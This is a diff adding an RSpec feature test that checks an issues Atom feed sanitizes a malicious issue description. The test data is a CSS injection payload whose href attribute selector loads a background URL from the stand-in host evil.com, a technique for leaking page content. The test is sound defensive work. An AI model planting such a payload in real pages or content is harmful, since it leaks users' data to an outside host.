@@ -94,6 +94,26 @@ RSpec.describe 'Issues Feed', feature_category: :devops_reports do
       end
     end
 
+    context 'with potentially malicious description' do
+      let_it_be(:malicious_issue) do
+        create(:issue,
+          author: user,
+          assignees: [assignee],
+          project: project,
+          description: "<style>*[href^=\"a\"]{background:url(//evil.com/a)}</style>\n\n**Legitimate text**",
+          due_date: Date.today
+        )
+      end
+
+      let_it_be(:issuable) { malicious_issue }
+
+      before do
+        visit project_issues_path(project, :atom, feed_token: user.feed_token)
+      end
+
+      it_behaves_like 'a sanitized issuable atom feed'
+    end
+
     it "renders atom feed with url parameters for project issues" do
       visit project_issues_path(project, :atom, feed_token: user.feed_token, state: 'opened', assignee_id: user.id)
 
